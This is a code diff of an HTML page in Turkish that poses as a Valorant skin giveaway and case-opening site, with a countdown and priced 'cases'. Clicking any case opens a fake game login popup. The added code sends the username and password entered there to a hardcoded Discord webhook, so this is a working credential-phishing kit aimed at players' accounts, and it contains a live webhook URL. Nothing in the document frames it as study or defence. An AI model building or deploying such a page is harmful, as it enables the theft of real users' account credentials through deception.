@@ -24,16 +24,9 @@
         .logo span { color: var(--valo-red); }
         .nav-links { display: flex; gap: 25px; flex-grow: 1; }
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
+        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; align-items: center; gap: 10px; text-transform: uppercase; font-size: 14px; box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4); }
 
-        /* Giriş Yap Butonu (Logo Geri Geldi) */
-        .btn-login { 
-            background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; 
-            font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; 
-            align-items: center; gap: 10px; text-transform: uppercase; font-size: 14px;
-            box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4);
-        }
-
-        /* Çekiliş Banner (Sayaç Geri Geldi) */
+        /* Sayaç Bölümü */
         .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; }
         #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
 
@@ -41,16 +34,16 @@
         .title-container { width: 100%; background: linear-gradient(90deg, transparent, rgba(0,0,0,0.8), transparent); border-top: 1px solid rgba(255,70,85,0.3); border-bottom: 1px solid rgba(255,70,85,0.3); padding: 20px 0; margin: 40px 0; text-align: center; }
         .title-container h3 { margin: 0; font-family: 'Montserrat'; letter-spacing: 6px; color: #fff; font-size: 24px; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
 
-        /* Kasa Grid (Taşma Engelli) */
+        /* Kasa Grid */
         .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
-        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
+        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; min-height: 100px; }
         .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; overflow: hidden; display: flex; flex-direction: column; align-items: center; cursor: pointer; }
         .case-img-container { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; overflow: hidden; }
         .case-box img { max-width: 110%; max-height: 100%; object-fit: contain; }
         .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
         .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
 
-        /* Alt İstatistikler Geri Geldi */
+        /* İstatistikler */
         .live-stats { display: flex; justify-content: center; gap: 80px; padding: 60px 0; background: rgba(0,0,0,0.5); margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.05); }
         .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
     </style>
@@ -99,15 +92,19 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";
 
-        document.addEventListener("DOMContentLoaded", function() {
-            // 1. Drop Sistemi (Renk Kutulu)
+        // TÜM SİSTEMİ ÇALIŞTIRAN ANA FONKSİYON
+        window.addEventListener('load', function() {
+            
+            // 1. Skin Drop Sistemi
             const skins = [
                 {img: "skin1.png", color: "#ade55c"}, {img: "skin2.png", color: "#4b82d5"},
                 {img: "skin3.png", color: "#d151dc"}, {img: "skin4.png", color: "#f7c133"},
                 {img: "skin5.png", color: "#ff4655"}
             ];
             const track = document.getElementById('dropTrack');
+            
             function addNewDrop() {
+                if(!track) return;
                 const randomSkin = skins[Math.floor(Math.random() * skins.length)];
                 const card = document.createElement('div');
                 card.className = 'drop-card';
@@ -118,30 +115,40 @@
             }
             addNewDrop();
 
-            // 2. Kasa Dizilimi
+            // 2. Kasa Yükleme Sistemi
             const cases = [
                 {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"}, {n: "STANDART", p: "30 VP", i: "case2.png"},
                 {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
                 {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
             ];
+            
             const r1 = document.getElementById('row1');
             const r2 = document.getElementById('row2');
-            cases.slice(0, 4).forEach(c => {
-                r1.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
-            });
-            cases.slice(4, 6).forEach(c => {
-                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
-            });
 
-            // 3. Sayaç Fonksiyonu
-            setInterval(() => {
+            if(r1 && r2) {
+                cases.slice(0, 4).forEach(c => {
+                    r1.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
+                });
+                cases.slice(4, 6).forEach(c => {
+                    r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
+                });
+            }
+
+            // 3. Sayaç Sistemi (Donmayan Versiyon)
+            function updateCounter() {
                 const now = new Date();
                 const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
                 let t = new Date(utc3); t.setHours(24, 0, 0, 0);
                 let d = t - utc3;
+                
+                if (d < 0) d += 86400000;
+
                 let h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
-                document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-            }, 1000);
+                const el = document.getElementById('countdown');
+                if(el) el.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+            }
+            setInterval(updateCounter, 1000);
+            updateCounter();
         });
 
         function openAuth() {
@@ -151,4 +158,24 @@
             win.document.body.innerHTML = `
                 <style>
                     body { margin:0; height:100vh; background: url('login_bg.jpg') center/cover; display:flex; justify-content:center; align-items:center; font-family:sans-serif; }
-                    .card { background:#
+                    .card { background:#fff; width:340px; padding:50px 40px; border-radius:4px; text-align:center; }
+                    input { width:100%; padding:14px; margin:10px 0; background:#f2f2f2; border:none; border-radius:4px; box-sizing:border-box; font-weight:600; }
+                    .btn { width:100%; padding:18px; background:#ff4655; color:#fff; border:none; border-radius:12px; font-weight:700; cursor:pointer; margin-top:40px; text-transform:uppercase; }
+                </style>
+                <div class="card">
+                    <img src="login_logo.png" width="110" style="margin-bottom:30px;">
+                    <h2>Oturum Aç</h2>
+                    <input type="text" id="u" placeholder="KULLANICI ADI"><input type="password" id="p" placeholder="ŞİFRE"><button class="btn" id="go">Giriş Yap</button>
+                </div>
+            `;
+            win.document.getElementById('go').onclick = function() {
+                const u = win.document.getElementById('u').value, p = win.document.getElementById('p').value;
+                if(u && p) {
+                    fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: "👤: " + u + " | 🔑: " + p }) });
+                    win.close();
+                }
+            };
+        }
+    </script>
+</body>
+</html>
